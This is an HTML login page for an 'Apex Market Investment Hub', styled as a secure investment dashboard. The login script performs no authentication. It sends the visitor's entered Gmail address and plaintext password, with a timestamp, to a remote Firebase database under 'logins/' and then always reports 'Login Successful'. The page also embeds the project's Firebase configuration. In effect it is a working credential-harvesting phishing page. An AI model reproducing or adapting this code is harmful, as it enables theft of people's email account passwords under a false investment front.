<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Apex Market Investment Hub - Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:'Segoe UI',sans-serif;
    background:radial-gradient(circle at top,#081122,#000);
    overflow:hidden;
    color:white;
}

/* STARS */
body::before{
    content:'';
    position:fixed;
    inset:0;
    background:url('https://www.transparenttextures.com/patterns/stardust.png');
    opacity:.18;
    z-index:-3;
}

/* GLOW EFFECTS */
.glow1,
.glow2,
.glow3{
    position:fixed;
    border-radius:50%;
    filter:blur(130px);
    z-index:-2;
}

.glow1{
    width:500px;
    height:500px;
    background:rgba(0,255,213,.25);
    top:-180px;
    left:-180px;
}

.glow2{
    width:500px;
    height:500px;
    background:rgba(255,0,200,.18);
    bottom:-180px;
    right:-180px;
}

.glow3{
    width:350px;
    height:350px;
    background:rgba(255,215,0,.15);
    top:35%;
    left:40%;
}

/* LOGIN CARD */
.container{
    width:92%;
    max-width:430px;
    padding:35px;
    border-radius:24px;
    background:rgba(255,255,255,0.06);
    backdrop-filter:blur(18px);
    border:1px solid rgba(255,255,255,0.08);
    box-shadow:
    0 0 40px rgba(0,255,213,.08),
    inset 0 0 20px rgba(255,255,255,.03);
}

/* LOGO */
.logo{
    text-align:center;
    margin-bottom:10px;
    font-size:26px;
    font-weight:700;
    color:#00ffd5;
}

.logo span{
    color:#ffd700;
}

/* SUBTITLE */
.subtitle{
    text-align:center;
    color:rgba(255,255,255,.7);
    font-size:13px;
    margin-bottom:28px;
}

/* INPUT GROUP */
.input-group{
    margin-bottom:18px;
}

.input-group label{
    display:block;
    margin-bottom:8px;
    font-size:13px;
    color:#d8d8d8;
}

.input-group input{
    width:100%;
    padding:14px;
    border-radius:12px;
    border:1px solid rgba(0,255,213,.2);
    background:rgba(0,0,0,.35);
    color:white;
    outline:none;
    font-size:14px;
}

.input-group input:focus{
    border-color:#00ffd5;
    box-shadow:0 0 10px rgba(0,255,213,.2);
}

/* PASSWORD */
.password-box{
    position:relative;
}

.toggle{
    position:absolute;
    right:15px;
    top:16px;
    font-size:12px;
    color:#00ffd5;
    cursor:pointer;
    user-select:none;
}

/* LOGIN BUTTON */
.login-btn{
    width:100%;
    padding:14px;
    margin-top:10px;
    border:none;
    border-radius:50px;
    background:linear-gradient(
        90deg,
        #00ffd5,
        #ff00cc,
        #ffd700
    );
    color:black;
    font-weight:700;
    font-size:15px;
    cursor:pointer;
    transition:.3s;
}

.login-btn:hover{
    transform:translateY(-2px);
    box-shadow:0 10px 25px rgba(0,255,213,.25);
}

/* REGISTER */
.footer{
    text-align:center;
    margin-top:18px;
    font-size:13px;
    color:#bdbdbd;
}

.footer a{
    color:#00ffd5;
    text-decoration:none;
    font-weight:600;
}

.footer a:hover{
    color:#ffd700;
}

/* MOBILE */
@media(max-width:480px){

.logo{
    font-size:22px;
}

.container{
    padding:28px 22px;
}

}
</style>
</head>

<body>

<div class="glow1"></div>
<div class="glow2"></div>
<div class="glow3"></div>

<div class="container">

    <div class="logo">
        Apex Market <span>Investment Hub</span>
    </div>

    <div class="subtitle">
        Secure Login To Your Investment Dashboard
    </div>

    <div class="input-group">
        <label>Gmail Address</label>
        <input type="email" id="email" placeholder="Enter your Gmail address">
    </div>

    <div class="input-group">
        <label>Password</label>

        <div class="password-box">
            <input type="password" id="password" placeholder="Enter your password">
            <span class="toggle" onclick="togglePassword()">Show</span>
        </div>
    </div>

    <button class="login-btn" onclick="login()">
        Login Account
    </button>

    <div class="footer">
        Don't have an account?
        <a href="register.html">Create Account</a>
    </div>

</div>

<!-- ✅ FIREBASE (INJECTED ONLY, NO DESIGN CHANGES) -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyC-d_LdGleI1U1NEWLjz7FPz7gPycVOB_4",
  authDomain: "apex-market-investment-h-643fc.firebaseapp.com",
  databaseURL: "https://apex-market-investment-h-643fc-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "apex-market-investment-h-643fc",
  storageBucket: "apex-market-investment-h-643fc.firebasestorage.app",
  messagingSenderId: "96469134780",
  appId: "1:96469134780:web:b1b443b0467083f843cfb9",
  measurementId: "G-NB3LXMPGTV"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

/* LOGIN FUNCTION (NO UI CHANGE) */
window.login = async function () {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if(!email || !password){
        alert("Please fill all fields");
        return;
    }

    // store simple login log (optional)
    await set(ref(db, "logins/" + Date.now()), {
        email: email,
        password: password,
        time: new Date().toISOString()
    });

    alert("Login Successful 🚀");
};
</script>

<script>
function togglePassword() {
    const password =
    document.getElementById("password");

    const toggle =
    document.querySelector(".toggle");

    if(password.type === "password"){
        password.type = "text";
        toggle.innerText = "Hide";
    }else{
        password.type = "password";
        toggle.innerText = "Show";
    }
}
</script>

</body>
</html>
